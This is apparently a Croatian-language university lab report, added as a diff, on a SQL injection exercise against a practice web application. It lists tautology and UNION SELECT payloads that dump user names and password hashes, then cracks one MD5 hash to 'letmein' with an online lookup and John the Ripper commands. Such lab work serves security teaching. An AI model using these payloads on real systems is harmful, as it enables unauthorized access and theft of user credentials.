@@ -1,0 +1,34 @@
+================
+=== Postupak ===
+================
+
+1. Unesen tekst: 
+  a' OR '1'='1
+
+Ovo stvara sql upit koji u WHERE dijelu ima tautologiju te vraća sve rezultate iz tablice.
+Traženi Pablo Picasso ima id 4.
+
+2. Zatim je unesen sljedeći tekst:
+  a' UNION SELECT CONCAT(first_name, ' ', last_name), password FROM users WHERE '1'='1
+
+Ovo stvara sql upit koji na prvo polje stavlja kokatenirano ime i prezime korisnika, a na drugo polje stavlja sažetak lozinke.
+Sada se može očitati traženi sažetak lozinke. 
+Traženi sažetak Pabla Picassa je 0d107d09f5bbe40cade3de5c71e9e9b7.
+
+Ova je vratilo sažetke svih korisnika, međutim budući da tražimo samo lozinku Pabla Picassa mogli smo 
+koristiti i izraz sličan sljedećem, ovo je moguće jer smo prethodno saznali id korisnika:
+  a' UNION SELECT CONCAT(first_name, ' ', last_name), password FROM users WHERE user_id = '4
+
+3. Ubacio sam sažetak u mrežni alat "crackstation.net" i kao rezultat dobio lozinku "letmein".
+
+(4.) Probao sam i alat John the Ripper, rezultat je ista očekivano ista lozinka, kod toga koraci su bili sljedeći:
+4.1 echo "0d107d09f5bbe40cade3de5c71e9e9b7" > "hashes.txt"
+4.2 cd ~srs/srs-lab/Lab3
+4.3 sudo john/run/john --show --format=raw-md5 ~/hashes.txt
+
+
+===============
+=== LOZINKA ===
+===============
+
+letmein
